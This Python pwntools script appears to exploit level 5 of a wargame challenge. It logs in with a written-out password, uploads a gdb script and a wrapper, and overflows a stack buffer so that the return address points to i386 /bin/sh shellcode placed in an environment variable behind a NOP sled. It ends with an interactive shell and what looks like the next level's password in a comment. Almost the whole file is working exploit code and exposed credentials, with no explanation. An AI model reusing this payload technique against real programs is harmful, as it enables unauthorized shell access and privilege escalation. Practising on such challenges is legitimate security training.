from lib.exploit import *
import time


gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble

def show_ret
x/2wx $ebp
end

def show_args
x/3wx $esp
end

def nextt
si
finish
end

# find env vars
def show_stack
x/20wx $ebp
end

unset env
show env


set follow-fork-mode child
# break at main in wrapper script
b *main
r `cat payload` `cat env_payload`

b *execve
c
si
si
del
break *main
c
# now in main in target prog


# main
b *0x08048519

# strlen
b *0x080484e4

c

'''

LEVEL = "5"

def prepare_env(s):
    s.process(["rm", "-rf", CWD]).recvall()
    s.process(["mkdir", CWD]).recvall()
    upload(s, gdb_script, CWD + "gdb.script")

    remote_wrapper = CWD + "wrapper"
    wrapper_src = read("./5/wrapper.cpp")
    upload(s, wrapper_src, CWD + "wrapper.cpp")
    log.warn("%s " % s.process(["gcc", "-m32", "-no-pie", "wrapper.cpp", "-o", "wrapper"], cwd=CWD).recvall())
    log.info("%s " % s.process(["chmod", "a+x", remote_wrapper], cwd=CWD).recvall())


# s = connect_to_local(LEVEL, "woucaejiek", remote=False)
s = connect(LEVEL, "woucaejiek")
from lib.exploit import *

prepare_env(s)

log.info("############################################################################################################################################################")
log.info("# FIND OFF UNTIL RET")
log.info("############################################################################################################################################################")

env_payload_adr = 0xffffdf1f + 50

payload = b"A"*(0x14-4)
payload += pack(env_payload_adr, 32)

upload(s, payload, CWD+"payload")

env_payload = b"\x90"*100
env_payload += asm(pwnlib.shellcraft.i386.sh())

upload(s, env_payload, CWD+"env_payload")



io = s.process(["env", "-i", CWD+"wrapper", payload, env_payload])
io.interactive()


# eiluquieth



